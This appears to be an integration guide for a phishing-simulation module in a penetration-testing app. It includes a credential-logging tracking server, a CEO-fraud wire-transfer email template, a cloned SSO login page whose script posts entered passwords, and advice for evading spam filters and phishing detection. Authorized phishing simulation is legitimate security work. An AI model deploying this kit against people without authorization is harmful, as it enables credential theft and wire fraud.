# Social Engineering Module Integration Guide

## Overview

This guide will help you integrate the Social Engineering Module into your existing DonkTool penetration testing application. The module provides professional phishing simulation capabilities with campaign management, email templates, landing pages, and comprehensive analytics.

## ⚠️ Legal Disclaimer

**IMPORTANT**: This module is designed for authorized security testing only. Before using:

1. Obtain written authorization from the target organization
2. Have a signed penetration testing agreement
3. Ensure compliance with local laws and regulations
4. Maintain professional liability insurance
5. Follow responsible disclosure practices

## Integration Steps

### 1. Add Files to Your Project

Add the following files to your DonkTool Xcode project:

```
DonkTool/
├── SocialEngineering/
│   ├── SocialEngineeringModule.swift
│   ├── SocialEngineeringViews.swift
│   └── EmailTemplates/
│       └── (template resources)
```

### 2. Update AppState

Add Social Engineering state to your existing `AppState` class:

```swift
// In Models.swift or AppState.swift
extension AppState {
    // Social Engineering properties
    @Published var socialEngineeringManager = SocialEngineeringManager()
    @Published var activeCampaigns: [PhishingCampaign] = []
    @Published var isPhishingCampaignActive = false
    @Published var currentPhishingTarget = ""
    @Published var phishingCampaignProgress: Double = 0.0
}
```

### 3. Add Navigation Entry

Update your main navigation to include the Social Engineering module:

```swift
// In ContentView.swift
NavigationLink(destination: SocialEngineeringView()) {
    Label("Social Engineering", systemImage: "envelope.badge.shield.half.filled")
}
```

### 4. Update Info.plist

Add required permissions for the Social Engineering features:

```xml
<key>NSAppTransportSecurity</key>
<dict>
    <key>NSAllowsArbitraryLoads</key>
    <false/>
    <key>NSExceptionDomains</key>
    <dict>
        <!-- Add your phishing domains here during testing -->
    </dict>
</dict>
```

### 5. Configure SMTP Settings

The module requires SMTP configuration for sending phishing emails. Create a configuration file:

```swift
// SocialEngineeringConfig.swift
struct SocialEngineeringConfig {
    static let defaultSMTPProfile = SendingProfile(
        name: "Default SMTP",
        smtpHost: "your-smtp-server.com",
        smtpPort: 587,
        username: "your-username",
        password: "your-password", // Use keychain in production
        useTLS: true,
        useStartTLS: false,
        sendRate: 50 // emails per hour
    )
    
    // Tracking server configuration
    static let trackingServerURL = "https://your-tracking-server.com"
    static let landingPageBaseURL = "https://your-landing-pages.com"
}
```

### 6. Set Up Tracking Server

You'll need a web server to handle tracking pixels and link clicks. Here's a basic Express.js example:

```javascript
// tracking-server.js
const express = require('express');
const app = express();

// Tracking pixel endpoint
app.get('/pixel/:trackingId', (req, res) => {
    const { trackingId } = req.params;
    
    // Log email open event
    logEvent(trackingId, 'email_opened', {
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date()
    });
    
    // Return 1x1 transparent pixel
    const pixel = Buffer.from('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==', 'base64');
    res.set('Content-Type', 'image/gif');
    res.send(pixel);
});

// Click tracking endpoint
app.get('/click/:trackingId', (req, res) => {
    const { trackingId } = req.params;
    const { url } = req.query;
    
    // Log click event
    logEvent(trackingId, 'link_clicked', {
        url: url,
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date()
    });
    
    // Redirect to actual URL
    res.redirect(url);
});

// Landing page endpoint
app.post('/landing/:trackingId', express.json(), (req, res) => {
    const { trackingId } = req.params;
    const formData = req.body;
    
    // Log credential submission
    logEvent(trackingId, 'credentials_submitted', {
        formData: formData, // Be careful with sensitive data
        ip: req.ip,
        userAgent: req.headers['user-agent'],
        timestamp: new Date()
    });
    
    res.json({ success: true });
});

app.listen(3000, () => {
    console.log('Tracking server running on port 3000');
});
```

### 7. Default Email Templates

The module includes several default templates. You can add more by extending the `DefaultTemplates` struct:

```swift
extension DefaultTemplates {
    static func addCustomTemplates() -> [EmailTemplate] {
        return [
            EmailTemplate(
                name: "CEO Fraud",
                subject: "Urgent: Wire Transfer Required",
                senderName: "John Smith (CEO)",
                senderEmail: "ceo@company.com",
                replyTo: nil,
                htmlContent: """
                <html>
                <body>
                    <p>Hi {{firstName}},</p>
                    <p>I need you to process an urgent wire transfer. 
                    I'm in a meeting and can't call.</p>
                    <p>Please <a href="{{link}}">click here</a> to 
                    view the transfer details.</p>
                    <p>Thanks,<br>John</p>
                </body>
                </html>
                """,
                textContent: "Urgent wire transfer required...",
                attachments: [],
                trackingEnabled: true,
                category: .financial,
                difficulty: .hard,
                tags: ["ceo-fraud", "wire-transfer", "urgent"]
            )
        ]
    }
}
```

### 8. Landing Page Templates

Create landing pages that mimic your organization's login pages:

```swift
let corporateLoginPage = LandingPageTemplate(
    name: "Corporate SSO Login",
    url: "/sso-login",
    htmlContent: """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Corporate SSO - Sign In</title>
        <meta name="viewport" content="width=device-width, initial-scale=1">
    </head>
    <body>
        <div class="container">
            <img src="/logo.png" alt="Company Logo" class="logo">
            <h1>Sign In to Your Account</h1>
            
            <form id="loginForm" method="post">
                <div class="form-group">
                    <label for="email">Email Address</label>
                    <input type="email" id="email" name="email" required>
                </div>
                
                <div class="form-group">
                    <label for="password">Password</label>
                    <input type="password" id="password" name="password" required>
                </div>
                
                <div class="form-group">
                    <input type="checkbox" id="remember" name="remember">
                    <label for="remember">Remember me</label>
                </div>
                
                <button type="submit" class="btn-primary">Sign In</button>
                
                <p class="help-text">
                    <a href="#">Forgot your password?</a>
                </p>
            </form>
        </div>
    </body>
    </html>
    """,
    cssContent: """
    /* Your corporate styling here */
    body {
        font-family: -apple-system, BlinkMacSystemFont, sans-serif;
        background: #f5f5f5;
        margin: 0;
        padding: 20px;
    }
    
    .container {
        max-width: 400px;
        margin: 0 auto;
        background: white;
        padding: 40px;
        border-radius: 8px;
        box-shadow: 0 2px 4px rgba(0,0,0,0.1);
    }
    
    .logo {
        display: block;
        margin: 0 auto 30px;
        max-width: 200px;
    }
    
    /* ... more styles ... */
    """,
    jsContent: """
    document.getElementById('loginForm').addEventListener('submit', async (e) => {
        e.preventDefault();
        
        const formData = new FormData(e.target);
        const data = Object.fromEntries(formData);
        
        // Send to tracking server
        try {
            await fetch('/track', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            });
        } catch (error) {
            console.error('Tracking error:', error);
        }
        
        // Show success message
        alert('Your session has expired. You will be redirected to the real login page.');
        
        // Redirect to legitimate site
        setTimeout(() => {
            window.location.href = 'https://real-company-sso.com';
        }, 2000);
    });
    """,
    captureCredentials: true,
    redirectUrl: "https://real-company-sso.com",
    customFields: [],
    pageType: .login
)
```

### 9. Security Considerations

#### Email Headers
Add security headers to avoid spam filters:

```swift
// In EmailSendingService
func addSecurityHeaders(to email: inout PersonalizedEmail) {
    email.headers = [
        "X-Priority": "3",
        "X-Mailer": "Corporate Mail System",
        "List-Unsubscribe": "<mailto:unsubscribe@company.com>",
        "Precedence": "bulk"
    ]
}
```

#### Rate Limiting
Implement rate limiting to avoid detection:

```swift
// In CampaignExecutionEngine
let rateLimiter = RateLimiter(
    maxRequestsPerHour: 50,
    maxRequestsPerMinute: 5
)
```

#### Data Protection
Encrypt sensitive data:

```swift
// Use CryptoKit for encryption
import CryptoKit

func encryptCredentials(_ credentials: [String: String]) -> Data? {
    let key = SymmetricKey(size: .bits256)
    let data = try? JSONEncoder().encode(credentials)
    
    guard let data = data else { return nil }
    
    let sealedBox = try? AES.GCM.seal(data, using: key)
    return sealedBox?.combined
}
```

### 10. Testing the Integration

1. **Test Email Delivery**:
```swift
// Create a test campaign with yourself as the target
let testTarget = PhishingTarget(
    email: "your-email@example.com",
    firstName: "Test",
    lastName: "User",
    department: "IT",
    position: "Developer",
    customFields: [:],
    status: .pending,
    emailSentAt: nil,
    emailOpenedAt: nil,
    linkClickedAt: nil,
    credentialsSubmittedAt: nil,
    reportedAsPhishingAt: nil,
    interactions: []
)
```

2. **Verify Tracking**:
- Check that email opens are tracked
- Verify link clicks are logged
- Ensure landing pages capture data correctly

3. **Test Security Controls**:
- Verify rate limiting works
- Check that unauthorized domains are blocked
- Ensure data is encrypted properly

### 11. Production Deployment

Before deploying to production:

1. **Infrastructure**:
   - Set up dedicated SMTP server
   - Configure tracking server with HTTPS
   - Set up landing page hosting
   - Configure DNS records (SPF, DKIM, DMARC)

2. **Security**:
   - Use environment variables for credentials
   - Implement proper authentication
   - Set up audit logging
   - Configure firewall rules

3. **Compliance**:
   - Document authorization process
   - Set up data retention policies
   - Implement user consent tracking
   - Configure GDPR compliance if applicable

### 12. Dashboard Integration

Add social engineering metrics to your main dashboard:

```swift
// In ModernDashboardView.swift
MetricCard(
    title: "Active Campaigns",
    value: "\(appState.socialEngineeringManager.campaigns.filter { $0.status == .active }.count)",
    change: "+2",
    trend: .up,
    color: .orange,
    icon: "envelope.badge"
)

MetricCard(
    title: "Phishing Success Rate",
    value: "\(calculatePhishingSuccessRate())%",
    change: "-5%",
    trend: .down, // Lower is better
    color: .green,
    icon: "shield.checkered"
)
```

## Troubleshooting

### Common Issues

1. **Emails going to spam**:
   - Check SPF/DKIM records
   - Use proper email headers
   - Warm up IP addresses gradually

2. **Tracking not working**:
   - Verify tracking server is accessible
   - Check for CORS issues
   - Ensure tracking IDs are properly encoded

3. **Landing pages blocked**:
   - Use HTTPS for all pages
   - Avoid known phishing indicators
   - Test with different browsers

## Best Practices

1. **Campaign Planning**:
   - Start with less sophisticated templates
   - Gradually increase difficulty
   - Space campaigns appropriately

2. **Ethical Considerations**:
   - Always prioritize education over embarrassment
   - Provide immediate feedback to clicked users
   - Follow up with security awareness training

3. **Reporting**:
   - Focus on aggregate metrics, not individuals
   - Highlight improvements over time
   - Provide actionable recommendations

## Conclusion

The Social Engineering Module adds powerful phishing simulation capabilities to DonkTool. Always remember that this tool should only be used for authorized security testing and awareness training. Misuse could result in serious legal consequences.

For support or questions about the module, ensure you have proper authorization before conducting any tests.